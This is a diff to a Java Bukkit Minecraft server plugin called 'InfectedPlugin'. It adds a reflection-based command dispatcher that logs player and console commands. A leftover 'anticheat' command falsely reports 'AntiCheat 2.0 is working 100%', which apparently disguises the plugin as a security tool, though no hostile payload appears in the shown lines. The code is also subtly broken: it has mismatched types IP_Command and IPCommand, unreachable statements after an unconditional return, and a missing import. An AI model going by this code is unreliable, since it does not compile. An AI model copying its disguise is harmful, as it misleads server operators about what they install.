@@ -1,6 +1,6 @@
 package org.CreeperCoders.InfectedPlugin;
 
-import java.util.logging.Logger;
+import java.util.logging.*;
 import org.bukkit.*;
 import org.bukkit.entity.Player;
 import org.bukkit.plugin.PluginManager;
@@ -9,10 +9,14 @@ import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
 
 import org.CreeperCoders.InfectedPlugin.Commands.*;
+import org.CreeperCoders.InfectedPlugin.SlashCommands.*;
 
 public class InfectedPlugin extends JavaPlugin
 {
     public static final Logger log = Bukkit.getLogger();
+    
+    public static final String COMMAND_PATH = "org.CreeperCoders.InfectedPlugin.SlashCommands";
+    public static final String COMMAND_PREFIX = "Command";
 
     @Override
     public void onLoad()
@@ -58,6 +62,59 @@ public class InfectedPlugin extends JavaPlugin
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args)
     {
+        try
+        {
+            Player sender_p = null;
+            boolean senderIsConsole = false;
+            if (sender instanceof Player)
+            {
+                sender_p = (Player) sender;
+                log.info(String.format("[PLAYER_COMMAND] %s(%s): /%s %s",
+                        sender_p.getName(),
+                        ChatColor.stripColor(sender_p.getDisplayName()),
+                        commandLabel,
+                        IP_Util.implodeStringList(" ", Arrays.asList(args))));
+            }
+            else
+            {
+                senderIsConsole = true;
+                log.info(String.format("[CONSOLE_COMMAND] %s: /%s %s",
+                        sender.getName(),
+                        commandLabel,
+                        IP_Util.implodeStringList(" ", Arrays.asList(args))));
+            }
+            IP_Command dispatcher;
+            try
+            {
+                ClassLoader classLoader = InfectedPlugin.class.getClassLoader();
+                dispatcher = (IPCommand) classLoader.loadClass(String.format("%s.%s%s", COMMAND_PATH, COMMAND_PREFIX, cmd.getName().toLowerCase())).newInstance();
+                dispatcher.setPlugin(this);
+            }
+            catch (Throwable ex)
+            {
+                log.log(Level.SEVERE, "[" + getDescription().getName() + "] Command not loaded: " + cmd.getName(), ex);
+                sender.sendMessage(ChatColor.RED + "Command Error: Command not loaded: " + cmd.getName());
+                return true;
+            }
+
+            try
+            {
+                return dispatcher.run(sender, sender_p, cmd, commandLabel, args, senderIsConsole);
+            }
+            catch (Throwable ex)
+            {
+                sender.sendMessage(ChatColor.RED + "Command Error: " + ex.getMessage());
+            }
+
+            dispatcher = null;
+        }
+        catch (Throwable ex)
+        {
+            log.log(Level.SEVERE, "[" + getDescription().getName() + "] Command Error: " + commandLabel, ex);
+            sender.sendMessage(ChatColor.RED + "Unknown Command Error.");
+        }
+        return true;
+        
         if (commandLabel.equalsIgnoreCase("anticheat"))
         {
             sender.sendMessage(ChatColor.GREEN + "AntiCheat 2.0 is working 100%");
